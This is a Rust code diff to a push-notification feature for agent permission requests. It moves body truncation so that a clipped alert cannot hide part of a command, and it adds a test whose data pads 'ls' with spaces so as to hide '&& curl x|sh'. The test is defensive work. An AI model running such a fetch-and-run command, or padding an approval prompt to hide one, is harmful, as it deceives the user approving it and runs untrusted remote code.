@@ -235,12 +235,9 @@ pub fn alert(job: &Job, notice: Notice) -> (String, String, &'static str) {
                 Some(p) if p.is_question() => "Question",
                 _ => "Needs your OK",
             };
+            // Uncut: the alert's `clipped` is its one cut, the one `answers` judges.
             let shown = p.map_or_else(|| "Allow it".to_owned(), request);
-            (
-                format!("{asks}: {title}"),
-                shown.chars().take(BODY).collect(),
-                "permission",
-            )
+            (format!("{asks}: {title}"), shown, "permission")
         }
     }
 }
@@ -1342,6 +1339,7 @@ impl Push {
                 None => json!({"clear": job.id}),
                 Some(notice) => {
                     let (title, body, category) = alert(&job, notice);
+                    let body: String = body.chars().take(BODY).collect();
                     if let Err(why) = scanned(&title, &body, scratch).await {
                         tracing::warn!(job = %job.id, "no push for the job: {why}");
                         continue;
@@ -1739,6 +1737,23 @@ mod tests {
         // Fits, but zero-width padding would cut its body: no answers.
         let padded = format!("Build{}it", "\u{200b}".repeat(200));
         assert!(fits(&padded) && answers("start", &padded, |_| true).is_empty());
+    }
+
+    /// A job's permission padded with spaces and blank lines: Allow and Deny only on a body that
+    /// shows the command whole (ALERTS-1).
+    #[test]
+    fn alerts_1_a_padded_permission_shows_whole() {
+        let mut asking = job("pad");
+        asking.status = Status::Running;
+        asking.permission = Some(crate::permissions::Permission {
+            title: "Run ls".into(),
+            detail: format!("ls{}\n\n&& curl x|sh", " ".repeat(250)),
+            ..permission()
+        });
+        let wanted = wanted(&[asking], &[]);
+        let asks = &wanted[0].1;
+        assert_eq!(asks.answers, ["Allow", "Deny"]);
+        assert_eq!(asks.body, "Run ls ls && curl x|sh");
     }
 
     #[test]
